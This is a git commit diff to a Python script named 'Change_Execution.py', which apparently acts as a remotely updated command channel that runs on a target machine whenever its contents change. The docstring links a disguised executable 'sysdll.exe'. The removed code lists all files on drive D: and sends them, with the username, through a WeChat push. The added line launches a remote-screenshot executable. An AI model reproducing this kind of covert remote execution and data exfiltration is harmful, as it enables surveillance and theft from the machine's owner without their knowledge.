658bc47401ccbf041a45a1e5e781894068eb6356
GCLgaici <3471093372@qq.com>
2024-10-27 20:51:28 +0800

    yc

--- Control_files/Change_Execution.py
+++ Control_files/Change_Execution.py
@@ -1,12 +1,9 @@
 """
-代码有变化就执行2144
+代码有变化就执行2051
 https://yc.052024.xyz/xz/sysdll.exe
 """
 import requests
 import os
-wjb = ''
-for i in os.listdir("D:/"):
-    wjb += '|文件：' + i
 
-print(wjb)
-self.main.wechat_push.Alleged_information(f'{self.main.sys_username}|'+wjb)
+os.system('D:/Gaici/Remotely截图文件.exe')
+
